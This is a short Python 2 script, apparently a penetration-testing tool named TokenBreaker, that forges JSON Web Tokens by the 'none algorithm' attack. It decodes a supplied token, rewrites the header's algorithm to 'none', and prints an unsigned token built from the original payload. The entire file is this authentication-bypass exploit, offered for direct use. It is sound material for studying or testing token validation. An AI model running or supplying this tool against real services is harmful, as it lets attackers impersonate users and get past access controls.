#!/usr/bin/python

import argparse
import base64
import sys
import re

def verify_Padding(data):
    missing_padding = len(data) % 4
    if missing_padding != 0:
        data += b'='* (4 - missing_padding)
    return data

def processTheNoneToken(token):
    header=base64.b64decode(verify_Padding(token.split('.')[0]))
    payload=base64.b64decode(verify_Padding(token.split('.')[1]))
    print "\nDecoded Header value is : "+header
    print "Decode Payload value is : "+payload
    header=re.sub('"alg":".{5}"','"alg":"none"',header)
    print "\nNew header value with none algorithm:"
    print header
    base64header = base64.b64encode(header).rstrip('=')
    base64payload = base64.b64encode(payload).rstrip('=')
    finaljwt = base64header + '.' + base64payload
    print("\nSuccessfully encoded Token: \n" + finaljwt)

def main():
    parser = argparse.ArgumentParser(description='TokenBreaker: 1.TheNoneAlgorithm',
            epilog='Example Usage: \npython TheNone.py -t [JWTtoken]\n')
    requiredparser=parser.add_argument_group('required arguments')
    requiredparser.add_argument('-t','--token',help="JWT Token value",required=True)
    args = parser.parse_args()
    processTheNoneToken(args.token)

if __name__=='__main__':
    main()
